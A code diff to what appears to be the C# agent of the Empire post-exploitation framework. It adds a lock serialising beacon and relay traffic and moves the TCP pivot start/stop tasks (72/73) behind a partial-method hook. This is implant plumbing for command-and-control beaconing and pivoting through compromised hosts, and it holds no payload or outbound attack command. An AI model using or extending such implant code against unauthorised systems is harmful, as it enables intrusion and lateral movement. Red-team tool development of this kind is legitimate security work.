@@ -87,6 +87,11 @@ AESc = AES encrypted using the client's session key
     {
         public SessionInfo sessionInfo;
 
+        // One lock for every upstream send/poll: the beacon loop and each relay
+        // thread (SharpireTcp) serialise through it, whether the transport is
+        // HTTP or PivotConn.
+        private readonly object _upstreamLock = new object();
+
         internal int MissedCheckins { get; set; }
         private int ServerIndex = 0;
 
@@ -377,6 +382,9 @@ AESc = AES encrypted using the client's session key
         // semantics as TryMalleableGet.
         partial void TryMalleableSend(byte[] routingPacket, ref bool handled);
 
+        // Tasks 72/73 (tcp pivot start/stop), implemented in Empire.Agent.Pivot.Parent.cs.
+        partial void TryPivotTask(PACKET packet, ref byte[] result);
+
         // tcp:// pivot transport hooks, implemented in Empire.Agent.Pivot.Child.cs.
         partial void TryPivotGet(ref byte[] result, ref bool handled);
         partial void TryPivotSend(byte[] routingPacket, ref bool handled);
@@ -523,10 +531,6 @@ AESc = AES encrypted using the client's session key
                         jobTracking.StartAgentJob(packet.data, packet.taskId);
                         jobTracking.jobs[taskId.ToString()].Status = "running";
                         return EncodePacket(packet.type, "Job started: " + taskId.ToString(), packet.taskId);
-                    case 72:
-                        return StartTcpPivot(packet);
-                    case 73:
-                        return StopTcpPivot(packet);
                     case 120:
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return Task120(packet);
@@ -535,6 +539,9 @@ AESc = AES encrypted using the client's session key
 	                    jobTracking.jobs[taskId.ToString()].Status = "running";
 	                    return EncodePacket(packet.type, $"Job started: {taskId}", packet.taskId);
                     default:
+                        byte[] pivotResult = null;
+                        TryPivotTask(packet, ref pivotResult);
+                        if (pivotResult != null) return pivotResult;
                         jobTracking.jobs[taskId.ToString()].Status = "error";
                         return EncodePacket(0, "Invalid type: " + packet.type, packet.taskId);
                 }
